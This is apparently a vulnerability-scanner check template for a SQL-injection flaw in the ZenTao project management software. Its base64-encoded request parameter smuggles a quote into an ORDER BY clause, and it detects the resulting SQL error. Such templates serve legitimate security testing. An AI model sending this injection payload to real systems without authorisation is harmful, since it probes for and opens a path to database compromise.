name: poc-yaml-zentao-sqli
set:
  originHost: request.url.host
rules:
  - method: GET
    path: >-
      /index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxJyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=
    headers:
      Referer: http://{{originHost}}/zaotao/
    follow_redirects: true
    expression: >
      response.status == 200 && response.body.bcontains(bytes("SELECT %s FROM %s"))
detail:
  author: su(https://suzzz112113.github.io/#blog)
  links:
    - https://blog.csdn.net/weixin_33966365/article/details/93020545